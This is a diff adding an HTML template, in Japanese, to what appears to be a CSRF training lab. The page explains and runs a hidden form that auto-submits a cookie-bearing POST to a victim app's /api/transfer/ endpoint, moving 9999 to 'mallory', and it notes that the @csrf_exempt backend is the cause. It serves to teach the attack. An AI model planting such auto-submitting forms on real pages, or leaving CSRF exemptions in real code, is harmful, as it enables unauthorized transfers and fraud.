@@ -1,0 +1,48 @@
+{% extends "traps/base.html" %} {% block title %}罠①: 自動 form submit{% endblock %} {% block content %}
+<h2>罠①: 隠し form の自動 submit</h2>
+<p>
+  最も古典的な手口。ページを開いた瞬間に <code>&lt;form&gt;</code> が submit され、 被害者のブラウザは
+  <code>{{ victim_api_base }}/api/transfer/</code> へ Cookie 付き POST を送ってしまう。
+</p>
+
+<pre>
+&lt;form action="{{ victim_api_base }}/api/transfer/" method="POST"
+      enctype="application/x-www-form-urlencoded"&gt;
+  &lt;input name="to" value="mallory"&gt;
+  &lt;input name="amount" value="9999"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre
+>
+
+<p>
+  ポイント: <code>application/x-www-form-urlencoded</code> は CORS の
+  「単純リクエスト」扱いなので、ブラウザはプリフライトを行わずに送信する。 被害者バックエンドが
+  <code>@csrf_exempt</code> なため、そのまま処理されてしまう。
+</p>
+
+<hr style="border-color: #374151" />
+
+<p style="color: #fca5a5">↓ 5秒後に自動送信します（観察用に少し遅延）</p>
+<iframe name="evil_frame" style="display: none"></iframe>
+
+<form
+  id="evil"
+  action="{{ victim_api_base }}/api/transfer/"
+  method="POST"
+  enctype="application/x-www-form-urlencoded"
+  target="evil_frame"
+>
+  <input type="hidden" name="to" value="mallory" />
+  <input type="hidden" name="amount" value="9999" />
+</form>
+
+<script>
+  setTimeout(() => {
+    document.getElementById("evil").submit();
+    document.body.insertAdjacentHTML(
+      "beforeend",
+      '<p style="color:#86efac;">📤 送信しました。victim-frontend で残高を確認してください。</p>',
+    );
+  }, 5000);
+</script>
+{% endblock %}
